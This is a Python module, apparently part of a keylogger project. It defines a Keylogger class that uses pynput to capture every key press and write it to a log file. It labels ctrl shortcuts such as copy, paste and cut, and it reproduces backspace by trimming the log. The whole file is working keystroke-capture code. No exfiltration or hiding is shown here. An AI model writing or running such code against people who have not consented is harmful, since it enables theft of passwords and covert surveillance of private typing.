import os
from .interfaces import KeyloggerBase
from pynput.keyboard import Listener
from .log_handler import LogHandler


class Keylogger(KeyloggerBase):
    def __init__(self):
        self.keys_mapping = {
            "Key.space": " ",
            "Key.enter": " [ENTER] ",
            r"\x03": " [ctrl+c] ",
            r"\x16": " [ctrl+v] ",
            r"\x18": " [ctrl+x] ",
            r"\x1a": " [ctrl+z] ",
            r"\x01": " [ctrl+a] ",
            r"\x13": " [ctrl+s] ",
            r"\x12": " [ctrl+r] ",
            r"\x19": " [ctrl+y] ",
            r"\x06": " [ctrl+f] "

        }
        self.log_handler = LogHandler()

    def start_listener(self):
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

    def _on_key_press(self, pressed_key):
        pressed_key = str(pressed_key).replace("'", "")
        with self.log_handler.file as log:
            if pressed_key in self.keys_mapping:
                log.write(self.keys_mapping[pressed_key])
            elif pressed_key == "Key.backspace":  # Backspace functionality (like in text editor)
                self._handle_backspace()
            elif pressed_key.find("Key") == -1:
                log.write(pressed_key)

    def _handle_backspace(self):
        self.log_handler.open_mode = "rb+"
        with self.log_handler.file as log:
            log.seek(-1, os.SEEK_END)
            log.truncate()
        self.log_handler.open_mode = "a+"
